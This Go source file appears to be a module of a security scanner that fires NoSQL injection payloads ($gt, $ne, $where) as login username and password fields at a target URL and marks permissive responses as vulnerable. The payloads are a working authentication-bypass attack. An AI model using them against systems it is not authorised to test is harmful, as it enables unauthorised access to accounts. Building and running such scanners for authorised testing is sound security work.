package modules

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// NosqlInjectionTestingResult holds the result of the NosqlInjectionTesting module execution.
type NosqlInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// NosqlInjectionTesting executes the nosql_injection_testing security technique.
type NosqlInjectionTesting struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []NosqlInjectionTestingResult
	client     *http.Client
}

// NewNosqlInjectionTesting creates a new instance.
func NewNosqlInjectionTesting(target string) *NosqlInjectionTesting {
	return &NosqlInjectionTesting{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *NosqlInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var noSqlPayloads = []map[string]interface{}{
	{"$gt": ""},
	{"$ne": "123"},
	{"$where": "1==1"},
}

func (m *NosqlInjectionTesting) Execute(ctx context.Context) ([]NosqlInjectionTestingResult, error) {
	m.results = make([]NosqlInjectionTestingResult, 0)
	
	jobs := make(chan map[string]interface{}, len(noSqlPayloads))
	for _, p := range noSqlPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *NosqlInjectionTesting) testPayload(ctx context.Context, payload map[string]interface{}) {
	// Attempt to send a JSON payload pretending to be a login or search body
	body := map[string]interface{}{
		"username": payload,
		"password": payload,
	}
	bodyBytes, _ := json.Marshal(body)

	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer(bodyBytes))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	respStr := strings.ToLower(string(respBody))

	// Some common indicators of NoSQLi success: DB errors or auth bypass (e.g. returning a token or user profile)
	if strings.Contains(respStr, "mongoerror") || strings.Contains(respStr, "token") || resp.StatusCode == 200 {
		// Just a heuristic check for now
		if len(respStr) > 0 && !strings.Contains(respStr, "invalid login") {
			payloadStr, _ := json.Marshal(payload)
			m.mu.Lock()
			m.results = append(m.results, NosqlInjectionTestingResult{
				Target: m.Target,
				Status: "vulnerable",
				Detail: "Potential NoSQL injection successful using payload: " + string(payloadStr),
			})
			m.mu.Unlock()
		}
	}
}
